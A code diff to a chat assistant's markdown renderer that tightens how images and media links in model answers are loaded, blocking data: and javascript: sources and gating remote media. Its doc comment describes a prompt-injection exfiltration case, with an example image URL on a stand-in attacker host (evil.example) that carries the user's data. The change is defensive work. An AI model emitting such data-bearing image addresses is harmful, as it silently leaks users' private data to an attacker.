@@ -15,6 +15,9 @@ import remarkMath from 'remark-math'
 import { dollarMath } from './math.ts'
 import { WrapText } from 'lucide-react'
 import { CopyButton, IconAction } from './MessageActions.tsx'
+import { normalizedUrl } from '../../shared/media.ts'
+import { MediaContext } from './mediaContext.ts'
+import { playableKind, RemoteMedia } from './RemoteMedia.tsx'
 import { SourcesContext, sourceKey } from './sourcesContext.ts'
 import type { Source } from './turns.ts'
 
@@ -129,10 +132,11 @@ function CodeBlock({ node, ...props }: ComponentProps<'pre'> & ExtraProps) {
 }
 
 /**
- * Shows only images chibot serves. An answer written under the influence of a
- * planted page can hold an image whose address carries the user's data
- * (`![](https://evil.example/c?d=…)`); a browser that loads it has sent the
- * data without a click. Any other image is a link to open on purpose.
+ * Shows images chibot serves, and images and media from other sites through
+ * `RemoteMedia`, which loads only the ones a model could not have put the
+ * user's data in (the rest wait for a click). An answer written under the
+ * influence of a planted page can hold `![](https://evil.example/c?d=…)`; a
+ * browser that loads it has sent the data without a click.
  */
 function Image({
   node: _node,
@@ -141,22 +145,38 @@ function Image({
   ...props
 }: ComponentProps<'img'> & ExtraProps) {
   if (!src) return null
-  const own = URL.parse(src, location.origin)?.origin === location.origin
-  if (own) return <img src={src} alt={alt} {...props} />
+  const url = URL.parse(src, location.origin)
+  if (url?.origin === location.origin) {
+    return <img src={src} alt={alt} {...props} />
+  }
+  if (url?.protocol !== 'http:' && url?.protocol !== 'https:') {
+    // data:, javascript:, …: not shown, and not a link either.
+    return <span>{alt || 'Image'}</span>
+  }
+  // `![…](…)` is an image unless the address says it is sound or video.
+  return <RemoteMedia src={src} alt={alt} kind={playableKind(src) ?? 'image'} />
+}
+
+/**
+ * A link, and under it a player when it is a sound or video that the user or a
+ * tool gave (not one the model made up: that stays a link to open on purpose).
+ */
+function Link(props: ComponentProps<'a'> & ExtraProps) {
+  const media = useContext(MediaContext)
+  const { href } = props
+  const kind = href ? playableKind(href) : null
+  const address = href ? normalizedUrl(href) : null
+  const embedded = Boolean(media && kind && address && media.known.has(address))
   return (
-    <a
-      href={src}
-      target="_blank"
-      rel="noopener noreferrer"
-      title="Not loaded automatically: open it to see the image"
-    >
-      {alt || 'Image'}
-    </a>
+    <>
+      <SourceLink {...props} />
+      {embedded && href && kind && <RemoteMedia src={href} kind={kind} />}
+    </>
   )
 }
 
 /** Opens links in a new tab, so following one doesn't leave (and stop) the chat. */
-function Link({
+function SourceLink({
   node: _node,
   href,
   children,
